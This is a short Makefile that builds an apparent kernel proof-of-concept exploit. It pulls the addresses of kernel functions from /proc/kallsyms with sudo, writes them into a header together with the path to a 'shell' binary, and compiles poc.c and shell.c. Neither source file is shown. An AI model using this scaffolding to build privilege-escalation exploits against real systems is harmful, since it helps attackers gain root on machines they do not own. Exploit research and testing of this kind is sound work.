SYMLIST = user_path_at_empty|simple_setattr|path_put

.PHONY: all
all: poc.c ../shell/shell.c
	sudo grep -w -E '($(SYMLIST))' /proc/kallsyms | awk '{printf("#define X_%s 0x%s\n", $$3, $$1)}' >poc.h
	echo "#define SHELL \"$(CURDIR)/shell\"" >>poc.h
	gcc ../shell/shell.c -o shell
	gcc poc.c -o poc

.PHONY: clean
clean:
	rm -f shell poc poc.h
